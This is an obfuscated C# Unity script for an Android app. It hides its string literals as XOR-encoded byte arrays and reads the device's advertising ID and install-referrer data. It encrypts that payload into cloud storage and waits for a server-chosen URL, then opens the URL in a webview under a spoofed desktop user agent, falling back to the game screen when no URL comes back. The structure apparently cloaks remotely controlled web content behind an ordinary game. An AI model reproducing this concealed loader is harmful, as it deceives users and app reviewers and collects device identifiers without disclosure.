using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x6de4ac9a : MonoBehaviour
{
    internal bool IsGoogleAuthFlowUrl(string _0xad499be4)
    {
        if (string.IsNullOrEmpty(_0xad499be4))
            return false;
        return _0xad499be4.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[19] { 138, 136, 136, 132, 158, 133, 159, 152, 197, 140, 132, 132, 140, 135, 142, 197, 136, 132, 134 }, 235), StringComparison.OrdinalIgnoreCase) >= 0 || _0xad499be4.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[16] { 183, 181, 181, 185, 163, 184, 162, 165, 248, 177, 185, 185, 177, 186, 179, 248 }, 214), StringComparison.OrdinalIgnoreCase) >= 0 || _0xad499be4.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[21] { 246, 254, 254, 246, 253, 244, 228, 226, 244, 227, 242, 254, 255, 229, 244, 255, 229, 191, 242, 254, 252 }, 145), StringComparison.OrdinalIgnoreCase) >= 0 || _0xad499be4.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[11] { 29, 9, 14, 27, 14, 19, 25, 84, 25, 21, 23 }, 122), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private async Task _0xf35714f0()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x6dcd80bf = _0x1d049fc9._0x8f92ce0a(new byte[5] { 68, 67, 78, 81, 71 }, 34);
        _0x828f4b6d = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x861d85ec = DateTime.UtcNow.Ticks.ToString();
        _0x31a7d859 = "";
        JObject _0x73fe4521 = BuildRandomPayload(_0x8a84d556, _0xcfdafbe7, _0xb0db1dbc, _0x2575549b, _0x68b91c10, _0xd7999165, _0xaefb46b5, _0xf17f22c0, _0x59b39712, _0x3eff9c2d, _0x6dcd80bf, _0x31a7d859, _0xb8208a43, _0x23fbf75f, _0xd16f0d8d.ToString(), _0xaa26f6d0, _0x861d85ec, _0x828f4b6d, _0x1e834b18, _0x826a2fc7, _0xeb644c4c, _0x55c32e94, _0x1240df56());
        var _0xfcd12ea4 = _0x92c538ef(_0x73fe4521.ToString(), _0x1e834b18);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0x73fe4521}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x1d049fc9._0x8f92ce0a(new byte[7] { 183, 166, 190, 171, 168, 166, 163 }, 199) + _0x1e834b18, _0xfcd12ea4 } });
            await Task.Delay(500);
            string _0xdddd3908 = "";
            for (int _0xbe434e8c = 0; _0xbe434e8c < 20; _0xbe434e8c++)
            {
                if (await _0x1431bc5f(1, 1))
                {
                    await _0xa70dc5de(_0x1d049fc9._0x8f92ce0a(new byte[7] { 104, 102, 101, 105, 97, 111, 110 }, 10));
                    _0x0d6382ad();
                    return;
                }

                _0xdddd3908 = await _0x1c49d211(1, 500);
                if (!string.IsNullOrEmpty(_0xdddd3908))
                    break;
            }

            _0xdb056523(_0xdddd3908);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[22] { 4, 11, 26, 12, 11, 2, 127, 24, 58, 49, 58, 45, 62, 51, 127, 58, 45, 45, 48, 45, 101, 127 }, 95) + e.Message);
#endif
            }

            _0x0d6382ad();
        }
    }

    private string _0xaa26f6d0 = "";
    private string _0x23fbf75f = "";
    private string _0xeb644c4c = "";
    private string _0x6dcd80bf = "";
    private void OnApplicationFocus(bool _0x8b88a84a)
    {
        isApplicationFocus = _0x8b88a84a;
        if (_0x8b88a84a && _0x4096132e)
        {
            _0x18365448();
        }
    }

    private void _0x792e8620()
    {
        if (_0x10d43755)
        {
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[18] { 83, 110, 127, 98, 54, 119, 122, 100, 115, 119, 114, 111, 54, 101, 126, 121, 97, 120 }, 22));
            return;
        }

        _0x5bb15064(false);
        WLog(_0x1d049fc9._0x8f92ce0a(new byte[46] { 51, 31, 23, 16, 94, 41, 27, 28, 40, 23, 27, 9, 94, 46, 11, 13, 22, 94, 48, 17, 10, 23, 24, 23, 29, 31, 10, 23, 17, 16, 94, 86, 22, 31, 12, 26, 9, 31, 12, 27, 94, 28, 31, 29, 21, 87 }, 126));
        ++_0x2263a0bc;
        _0x99299274();
        if (_0x2263a0bc <= 1)
            return;
        if (_0x78f603fb())
        {
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[37] { 247, 202, 219, 198, 146, 193, 217, 219, 194, 194, 215, 214, 146, 159, 140, 146, 194, 221, 194, 199, 194, 193, 146, 193, 198, 219, 222, 222, 146, 221, 194, 215, 220, 215, 214, 136, 146 }, 178) + _0xe8116563.Count);
            return;
        }

        Application.Quit();
    }

    private string _0xb0db1dbc = "";
    private static string ReadPushField(Dictionary<string, object> _0x3fe0487b, string _0xe55e1a87)
    {
        if (_0x3fe0487b == null || string.IsNullOrEmpty(_0xe55e1a87))
            return string.Empty;
        if (_0x3fe0487b.TryGetValue(_0x1d049fc9._0x8f92ce0a(new byte[16] { 19, 18, 9, 20, 27, 20, 30, 28, 9, 20, 18, 19, 57, 28, 9, 28 }, 125), out var raw))
        {
            try
            {
                var _0xe8426b39 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0xe8426b39 != null && _0xe8426b39.TryGetValue(_0xe55e1a87, out var nestedVal))
                {
                    var _0x44480fc0 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x44480fc0))
                        return _0x44480fc0;
                }
            }
            catch
            {
            }
        }

        if (_0x3fe0487b.TryGetValue(_0xe55e1a87, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private async Task<bool> _0xa39d237f()
    {
        {
#if B_LOGS
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[37] { 13, 2, 51, 37, 34, 11, 118, 5, 63, 49, 56, 31, 56, 3, 56, 63, 34, 47, 5, 51, 36, 32, 63, 53, 51, 37, 23, 56, 57, 56, 47, 59, 57, 35, 37, 58, 47 }, 86));
#endif
        }

        try
        {
            var _0xf801a6bb = new InitializationOptions();
            await UnityServices.InitializeAsync(_0xf801a6bb);
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[32] { 230, 233, 216, 206, 201, 224, 157, 232, 211, 212, 201, 196, 238, 216, 207, 203, 212, 222, 216, 206, 157, 244, 211, 212, 201, 212, 220, 209, 212, 199, 216, 217 }, 189));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[20] { 132, 149, 131, 132, 240, 133, 190, 185, 164, 169, 131, 181, 162, 166, 185, 179, 181, 163, 234, 240 }, 208) + ex.Message);
#endif
            }

            _0xd55456c5?._0x0d6382ad();
            return true;
        }

        bool _0x834e4e4a = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x834e4e4a = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[37] { 180, 187, 138, 156, 155, 178, 207, 188, 134, 136, 129, 194, 134, 129, 207, 174, 129, 128, 129, 150, 130, 128, 154, 156, 193, 207, 191, 131, 142, 150, 138, 157, 207, 166, 171, 213, 207 }, 239) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x1e834b18 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[25] { 241, 224, 246, 241, 133, 246, 204, 194, 203, 136, 204, 203, 133, 228, 208, 209, 205, 133, 224, 247, 247, 234, 247, 159, 133 }, 165) + ex.Message);
#endif
                }

                _0xd55456c5?._0x0d6382ad();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[28] { 157, 140, 154, 157, 233, 154, 160, 174, 167, 228, 160, 167, 233, 155, 172, 184, 188, 172, 186, 189, 233, 140, 155, 155, 134, 155, 243, 233 }, 201) + ex.Message);
#endif
                }

                _0xd55456c5?._0x0d6382ad();
                return true;
            }
        }
        while (!_0x834e4e4a);
        return false;
    }

    internal string _0x1d744a58(string _0x7045b29d)
    {
        int _0x63eb1192 = _0x7045b29d.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[3] { 83, 94, 7 }, 58), StringComparison.OrdinalIgnoreCase);
        if (_0x63eb1192 < 0)
            return null;
        string _0xb1a0dcfc = _0x7045b29d.Substring(_0x63eb1192 + 3);
        int _0xb49c3481 = _0xb1a0dcfc.IndexOf('&');
        return _0xb49c3481 >= 0 ? _0xb1a0dcfc.Substring(0, _0xb49c3481) : _0xb1a0dcfc;
    }

    private bool _0xd87c776b = false;
    internal bool ContainsIgnoreCase(string _0xcd1e9cb4, string _0x11f110f3)
    {
        if (string.IsNullOrEmpty(_0xcd1e9cb4) || string.IsNullOrEmpty(_0x11f110f3))
            return false;
        return _0xcd1e9cb4.IndexOf(_0x11f110f3, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x2575549b = "";
    private string _0x13603008;
    private AndroidJavaObject _0xedc7b318 { get; set; }

    internal bool _0x148f04e9(string _0xc378fd04)
    {
        return _0xc378fd04.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[9] { 184, 180, 167, 190, 176, 161, 239, 250, 250 }, 213), StringComparison.OrdinalIgnoreCase) || _0xc378fd04.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[24] { 107, 119, 119, 115, 112, 57, 44, 44, 115, 111, 98, 122, 45, 100, 108, 108, 100, 111, 102, 45, 96, 108, 110, 44 }, 3), StringComparison.OrdinalIgnoreCase) || _0xc378fd04.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[23] { 212, 200, 200, 204, 134, 147, 147, 204, 208, 221, 197, 146, 219, 211, 211, 219, 208, 217, 146, 223, 211, 209, 147 }, 188), StringComparison.OrdinalIgnoreCase);
    }

    private bool _0xd06e0867 = false;
    private float _0xadebe39e = 0f;
    // NATIVE WEB VIEW METHODS
    private UniWebView _0x9df718e6 = null;
    private string _0xb8208a43 = "";
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x92c538ef(string _0x0dce31f7, string _0x28d0a1dc)
    {
        try
        {
            using var _0x7af28cf3 = Aes.Create();
            _0x7af28cf3.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x28d0a1dc));
            _0x7af28cf3.GenerateIV();
            using var _0xf05d26ab = new MemoryStream();
            _0xf05d26ab.Write(_0x7af28cf3.IV, 0, _0x7af28cf3.IV.Length);
            using (var _0x749f7f23 = new CryptoStream(_0xf05d26ab, _0x7af28cf3.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0xeeb60f92 = Encoding.UTF8.GetBytes(_0x0dce31f7);
                _0x749f7f23.Write(_0xeeb60f92, 0, _0xeeb60f92.Length);
                _0x749f7f23.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0xf05d26ab.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    internal void Update()
    {
        if (_0x9df718e6 == null)
            return;
        if (_0x481a3029())
            _0xd4d51f05();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x9d544791();
        if (_0x94cf20fe && _0xe0331d22 != null)
            _0xe0331d22.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private void _0x8f242749(string _0xde5506a1)
    {
        if (string.IsNullOrEmpty(_0xde5506a1))
            return;
        if (TryOpenExternalLikeChrome(_0xde5506a1))
            return;
        OpenUrlExternally(_0xde5506a1);
    }

    private readonly List<UniWebViewPopup> _0xe8116563 = new List<UniWebViewPopup>();
    private bool _0xa2f0dc29()
    {
        var _0x370134d9 = _0x61c0d178();
        if (_0x370134d9 == null)
            return false;
        WLog(_0x1d049fc9._0x8f92ce0a(new byte[31] { 193, 232, 251, 237, 254, 232, 251, 236, 169, 235, 232, 234, 226, 169, 164, 183, 169, 249, 230, 249, 252, 249, 169, 206, 230, 203, 232, 234, 226, 179, 169 }, 137) + _0x370134d9.Id);
        _0x370134d9.GoBack();
        return true;
    }

    internal bool IsAboutBlank(string _0x5bc5606f)
    {
        if (string.IsNullOrEmpty(_0x5bc5606f))
            return false;
        return _0x5bc5606f.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[11] { 231, 228, 233, 243, 242, 188, 228, 234, 231, 232, 237 }, 134), StringComparison.OrdinalIgnoreCase);
    }

    // WEB VIEW LOGIC END
    internal void _0x99299274()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x43c5afc9 = new AndroidNotificationChannel
        {
            Id = _0x1d049fc9._0x8f92ce0a(new byte[15] { 37, 36, 39, 32, 52, 45, 53, 30, 34, 41, 32, 47, 47, 36, 45 }, 65),
            Name = _0x1d049fc9._0x8f92ce0a(new byte[15] { 103, 70, 69, 66, 86, 79, 87, 3, 96, 75, 66, 77, 77, 70, 79 }, 35),
            Importance = Importance.High,
            Description = _0x1d049fc9._0x8f92ce0a(new byte[21] { 169, 139, 128, 139, 156, 143, 130, 206, 128, 129, 154, 135, 136, 135, 141, 143, 154, 135, 129, 128, 157 }, 238)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x43c5afc9);
        // Build notification
        var _0xfd2c9f34 = new AndroidNotification
        {
            Title = _0x69b60754[UnityEngine.Random.Range(0, _0x69b60754.Length)],
            Text = _0x1d049fc9._0x8f92ce0a(new byte[21] { 81, 98, 117, 48, 105, 127, 101, 48, 99, 101, 98, 117, 48, 100, 127, 48, 117, 104, 121, 100, 47 }, 16),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0xfd2c9f34, _0x1d049fc9._0x8f92ce0a(new byte[15] { 47, 46, 45, 42, 62, 39, 63, 20, 40, 35, 42, 37, 37, 46, 39 }, 75));
    }

    private void StopCurrentFailedLoad(UniWebView _0xdf16f4c4)
    {
        _0x5bb15064(false);
        if (_0xdf16f4c4 == null)
            return;
        _0xdf16f4c4.Stop();
        if (_0xdf16f4c4.CanGoBack)
            _0xdf16f4c4.GoBack();
    }

    private async Task<bool> _0x74c2f02e()
    {
        {
#if B_LOGS
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[29] { 208, 223, 238, 248, 255, 214, 171, 194, 248, 219, 249, 226, 253, 234, 232, 242, 202, 229, 239, 216, 234, 253, 238, 239, 200, 227, 238, 232, 224 }, 139));
#endif
        }

        string _0x31e3bead = "";
        for (int _0x38a681fe = 0; _0x38a681fe < 2; _0x38a681fe++)
        {
            if (await _0x1431bc5f(1, 100))
            {
                await _0xa70dc5de(_0x1d049fc9._0x8f92ce0a(new byte[7] { 134, 136, 139, 135, 143, 129, 128 }, 228));
                _0x0d6382ad();
                return true;
            }

            _0x31e3bead = await _0x1c49d211(1, 100);
            if (!string.IsNullOrEmpty(_0x31e3bead))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x31e3bead))
            {
                if (!string.IsNullOrEmpty(_0x90d5e8fd))
                {
                    _0x31e3bead = _0xb706b133(_0x31e3bead, _0x90d5e8fd);
                    {
#if B_LOGS
                        Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[53] { 3, 12, 61, 43, 44, 5, 120, 27, 57, 59, 48, 61, 60, 120, 62, 49, 54, 57, 52, 13, 42, 52, 120, 47, 49, 44, 48, 120, 43, 61, 54, 60, 49, 60, 120, 186, 222, 202, 120, 43, 48, 55, 47, 120, 15, 61, 58, 14, 49, 61, 47, 98, 120 }, 88) + _0x31e3bead);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[39] { 55, 56, 9, 31, 24, 49, 76, 47, 13, 15, 4, 9, 8, 76, 10, 5, 2, 13, 0, 57, 30, 0, 76, 142, 234, 254, 76, 31, 4, 3, 27, 76, 59, 9, 14, 58, 5, 9, 27 }, 108));
#endif
                    }
                }

                _0x81cb4b17 = true;
                _0x20c1feff(_0x31e3bead);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[44] { 155, 148, 165, 179, 180, 157, 224, 133, 184, 163, 165, 176, 180, 169, 175, 174, 224, 183, 168, 169, 172, 165, 224, 163, 168, 165, 163, 171, 169, 174, 167, 224, 179, 161, 182, 165, 164, 224, 172, 169, 174, 171, 250, 224 }, 192) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private string _0x68b91c10 = "";
    private string _0x59b39712 = "";
    private UniWebViewPopup _0x61c0d178()
    {
        for (int _0x4cbf1dae = _0xe8116563.Count - 1; _0x4cbf1dae >= 0; _0x4cbf1dae--)
        {
            var _0xc57fe665 = _0xe8116563[_0x4cbf1dae];
            if (_0xc57fe665 != null && _0xc57fe665.IsAlive)
                return _0xc57fe665;
            _0xe8116563.RemoveAt(_0x4cbf1dae);
        }

        return null;
    }

    private bool _0x81cb4b17 = false;
    internal Button _0xd2e9ac1f(string _0x11797a3d, Transform _0x83da5d5d)
    {
        var _0xde614ff0 = new GameObject(_0x11797a3d + _0x1d049fc9._0x8f92ce0a(new byte[3] { 190, 136, 146 }, 252), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xd0f18483 = _0xde614ff0.GetComponent<RectTransform>();
        _0xd0f18483.SetParent(_0x83da5d5d, false);
        var _0x46ae2774 = _0xde614ff0.GetComponent<Image>();
        _0x46ae2774.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0x1bf70cfa = _0xde614ff0.GetComponent<Button>();
        var _0x7857f95b = _0x1bf70cfa.colors;
        _0x7857f95b.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0x7857f95b.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0x1bf70cfa.colors = _0x7857f95b;
        var _0xc1405b0d = new GameObject(_0x1d049fc9._0x8f92ce0a(new byte[4] { 163, 146, 143, 131 }, 247), typeof(RectTransform), typeof(Text));
        var _0x45f9e150 = _0xc1405b0d.GetComponent<RectTransform>();
        _0x45f9e150.SetParent(_0xde614ff0.transform, false);
        _0x45f9e150.anchorMin = Vector2.zero;
        _0x45f9e150.anchorMax = Vector2.one;
        _0x45f9e150.offsetMin = _0x45f9e150.offsetMax = Vector2.zero;
        var _0x0b92a19c = _0xc1405b0d.GetComponent<Text>();
        _0x0b92a19c.text = _0x11797a3d;
        _0x0b92a19c.alignment = TextAnchor.MiddleCenter;
        _0x0b92a19c.color = Color.black;
        _0x0b92a19c.font = Resources.GetBuiltinResource<Font>(_0x1d049fc9._0x8f92ce0a(new byte[9] { 11, 56, 35, 43, 38, 100, 62, 62, 44 }, 74));
        _0x0b92a19c.fontSize = 28;
        WLog(_0x1d049fc9._0x8f92ce0a(new byte[14] { 127, 78, 89, 93, 72, 89, 126, 73, 72, 72, 83, 82, 28, 27 }, 60) + _0x11797a3d + _0x1d049fc9._0x8f92ce0a(new byte[1] { 251 }, 220));
        return _0x1bf70cfa;
    }

    private string _0xcfdafbe7 = "";
    private readonly string[] _0x69b60754 = new string[]
    {
        _0x1d049fc9._0x8f92ce0a(new byte[60] { 68, 43, 58, 4, 148, 224, 220, 209, 148, 198, 209, 209, 216, 199, 148, 213, 198, 209, 148, 220, 219, 192, 148, 198, 221, 211, 220, 192, 148, 218, 219, 195, 148, 86, 52, 39, 148, 208, 219, 218, 86, 52, 45, 192, 148, 217, 221, 199, 199, 148, 205, 219, 193, 198, 148, 199, 196, 221, 218, 149 }, 180),
        _0x1d049fc9._0x8f92ce0a(new byte[52] { 181, 218, 200, 197, 101, 12, 49, 101, 38, 42, 48, 41, 33, 101, 39, 32, 101, 60, 42, 48, 55, 101, 41, 48, 38, 46, 60, 101, 40, 42, 40, 32, 43, 49, 101, 167, 197, 214, 101, 50, 45, 60, 101, 54, 49, 42, 53, 101, 43, 42, 50, 122 }, 69),
        _0x1d049fc9._0x8f92ce0a(new byte[66] { 229, 157, 166, 232, 191, 136, 39, 69, 110, 96, 39, 112, 110, 105, 116, 39, 102, 117, 98, 39, 111, 110, 115, 115, 110, 105, 96, 39, 106, 104, 117, 98, 39, 104, 97, 115, 98, 105, 39, 115, 104, 99, 102, 126, 39, 229, 135, 148, 39, 116, 115, 102, 126, 39, 110, 105, 39, 115, 111, 98, 39, 96, 102, 106, 98, 41 }, 7),
        _0x1d049fc9._0x8f92ce0a(new byte[54] { 96, 15, 5, 2, 176, 196, 248, 249, 227, 176, 249, 227, 176, 224, 226, 249, 253, 245, 176, 228, 249, 253, 245, 176, 114, 16, 3, 176, 228, 248, 245, 176, 242, 245, 227, 228, 176, 224, 252, 241, 233, 245, 226, 227, 176, 224, 252, 241, 233, 176, 254, 255, 231, 190 }, 144),
        _0x1d049fc9._0x8f92ce0a(new byte[48] { 140, 227, 232, 217, 92, 37, 19, 9, 14, 92, 11, 21, 18, 18, 21, 18, 27, 92, 15, 8, 14, 25, 29, 23, 92, 31, 19, 9, 16, 24, 92, 30, 25, 92, 19, 18, 25, 92, 15, 12, 21, 18, 92, 29, 11, 29, 5, 82 }, 124),
        _0x1d049fc9._0x8f92ce0a(new byte[65] { 92, 51, 54, 44, 140, 230, 205, 207, 199, 220, 195, 216, 223, 140, 205, 222, 201, 140, 193, 195, 222, 201, 140, 205, 207, 216, 197, 218, 201, 140, 216, 195, 194, 197, 203, 196, 216, 140, 78, 44, 63, 140, 223, 216, 205, 213, 140, 205, 194, 200, 140, 216, 222, 213, 140, 213, 195, 217, 222, 140, 192, 217, 207, 199, 130 }, 172),
        _0x1d049fc9._0x8f92ce0a(new byte[55] { 93, 50, 35, 31, 141, 232, 219, 200, 223, 212, 141, 222, 221, 196, 195, 141, 206, 194, 216, 195, 217, 222, 141, 79, 45, 62, 141, 217, 197, 200, 141, 195, 200, 213, 217, 141, 194, 195, 200, 141, 206, 194, 216, 193, 201, 141, 207, 200, 141, 212, 194, 216, 223, 222, 131 }, 173),
        _0x1d049fc9._0x8f92ce0a(new byte[63] { 124, 51, 14, 113, 38, 17, 190, 206, 242, 255, 231, 251, 236, 237, 190, 236, 247, 249, 246, 234, 190, 240, 241, 233, 190, 255, 236, 251, 190, 233, 247, 240, 240, 247, 240, 249, 190, 124, 30, 13, 190, 250, 241, 240, 124, 30, 7, 234, 190, 233, 255, 242, 245, 190, 255, 233, 255, 231, 190, 231, 251, 234, 176 }, 158),
        _0x1d049fc9._0x8f92ce0a(new byte[51] { 214, 185, 169, 160, 6, 105, 72, 74, 95, 6, 82, 78, 73, 85, 67, 6, 81, 78, 73, 6, 85, 82, 71, 95, 6, 79, 72, 6, 82, 78, 67, 6, 65, 71, 75, 67, 6, 81, 79, 72, 6, 82, 78, 67, 6, 86, 84, 79, 92, 67, 8 }, 38),
        _0x1d049fc9._0x8f92ce0a(new byte[64] { 99, 27, 32, 110, 57, 14, 161, 204, 238, 236, 228, 239, 245, 244, 236, 161, 232, 242, 161, 228, 247, 228, 243, 248, 245, 233, 232, 239, 230, 161, 99, 1, 18, 161, 234, 228, 228, 241, 161, 242, 241, 232, 239, 239, 232, 239, 230, 161, 231, 238, 243, 161, 248, 238, 244, 243, 161, 226, 233, 224, 239, 226, 228, 175 }, 129)
    };
    internal Rect lastSafe = Rect.zero;
    // PART 3
    private string _0x710b64d4()
    {
        try
        {
            var _0x9d23c3e6 = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[30] { 98, 110, 108, 47, 116, 111, 104, 117, 120, 50, 101, 47, 113, 109, 96, 120, 100, 115, 47, 84, 111, 104, 117, 120, 81, 109, 96, 120, 100, 115 }, 1));
            var _0xdcb15cbc = _0x9d23c3e6.GetStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[15] { 188, 170, 173, 173, 186, 177, 171, 158, 188, 171, 182, 169, 182, 171, 166 }, 223));
            var _0x4bfad84a = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[57] { 56, 52, 54, 117, 60, 52, 52, 60, 55, 62, 117, 58, 53, 63, 41, 52, 50, 63, 117, 60, 54, 40, 117, 58, 63, 40, 117, 50, 63, 62, 53, 47, 50, 61, 50, 62, 41, 117, 26, 63, 45, 62, 41, 47, 50, 40, 50, 53, 60, 18, 63, 24, 55, 50, 62, 53, 47 }, 91));
            var _0xf7e3ac2e = _0x4bfad84a.CallStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[20] { 144, 146, 131, 182, 147, 129, 146, 133, 131, 158, 132, 158, 153, 144, 190, 147, 190, 153, 145, 152 }, 247), _0xdcb15cbc);
            var _0x55d1819a = _0xf7e3ac2e.Call<string>(_0x1d049fc9._0x8f92ce0a(new byte[5] { 237, 239, 254, 195, 238 }, 138));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x55d1819a}");
#endif
            }

            return string.IsNullOrEmpty(_0x55d1819a) ? "" : _0x55d1819a;
        }
        catch
        {
            return "";
        }
    }

    private void _0x20c1feff(string _0x09d67d81)
    {
        _0x18365448();
        StartCoroutine(_0x755f5894(_0x09d67d81));
    }

    private bool _0xc911ee41 = false;
    private void _0xc4fb749e(UniWebView _0xe27e6cad)
    {
        _0xe27e6cad.BackgroundColor = Color.clear;
        _0xe27e6cad.SetSupportMultipleWindows(true, true);
        _0xe27e6cad.SetBackButtonEnabled(false);
        _0x9df718e6.SetUserAgent(_0xf654ce05());
    }

    internal bool isDestroyedForce = false;
    public void _0x0d6382ad()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[18] { 90, 85, 100, 114, 117, 92, 33, 77, 96, 116, 111, 98, 105, 33, 70, 96, 108, 100 }, 1));
#endif
        }

        _0x347b2c13.Instance?._0x5271cd13();
        _0x2a281dda.Instance._0x4771d9b3(_0xf90e3ec3._0x5f839e9d.DEFAULT);
    }

    private Text _0xbbf8464f;
    // WEB VIEW LOGIC
    public bool _0x4096132e { get; set; }

    private void _0x265c57c5()
    {
        if (_0x9df718e6 == null)
            return;
        if (_0xf7e4abee)
            _0x9df718e6.SetUserAgent(_0xf654ce05());
        else
            _0x9df718e6.SetUserAgent("");
    }

    private static readonly string WindowsDesktopUserAgent = _0x1d049fc9._0x8f92ce0a(new byte[111] { 125, 95, 74, 89, 92, 92, 81, 31, 5, 30, 0, 16, 24, 103, 89, 94, 84, 95, 71, 67, 16, 126, 100, 16, 1, 0, 30, 0, 11, 16, 103, 89, 94, 6, 4, 11, 16, 72, 6, 4, 25, 16, 113, 64, 64, 92, 85, 103, 85, 82, 123, 89, 68, 31, 5, 3, 7, 30, 3, 6, 16, 24, 123, 120, 100, 125, 124, 28, 16, 92, 89, 91, 85, 16, 119, 85, 83, 91, 95, 25, 16, 115, 88, 66, 95, 93, 85, 31, 1, 2, 0, 30, 0, 30, 0, 30, 0, 16, 99, 81, 86, 81, 66, 89, 31, 5, 3, 7, 30, 3, 6 }, 48);
    public void _0xc4fd95cc()
    {
        if (_0x4096132e)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[33] { 22, 25, 40, 62, 57, 16, 109, 25, 36, 32, 40, 63, 109, 34, 56, 57, 109, 96, 115, 109, 32, 34, 59, 40, 109, 57, 34, 109, 62, 46, 40, 35, 40 }, 77));
            }
#endif
        }

        _0x0d6382ad();
    }

    internal Vector2 lastSize = Vector2.zero;
    private bool TryOpenExternalLikeChrome(string _0x73b5161d)
    {
        if (string.IsNullOrEmpty(_0x73b5161d))
            return false;
        if (_0x73b5161d.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[9] { 98, 101, 127, 110, 101, 127, 49, 36, 36 }, 11), StringComparison.OrdinalIgnoreCase))
            return _0x45d6b6f4(_0x73b5161d);
        if (_0x148f04e9(_0x73b5161d))
            return _0xcfb752c7(_0x73b5161d, null);
        if (!_0x73b5161d.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[7] { 81, 77, 77, 73, 3, 22, 22 }, 57), StringComparison.OrdinalIgnoreCase) && !_0x73b5161d.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[8] { 150, 138, 138, 142, 141, 196, 209, 209 }, 254), StringComparison.OrdinalIgnoreCase) && !_0x73b5161d.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[11] { 182, 181, 184, 162, 163, 237, 181, 187, 182, 185, 188 }, 215), StringComparison.OrdinalIgnoreCase))
        {
            return _0x16ec9c4c(_0x73b5161d);
        }

        return false;
    }

    private string _0x861d85ec = "";
    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
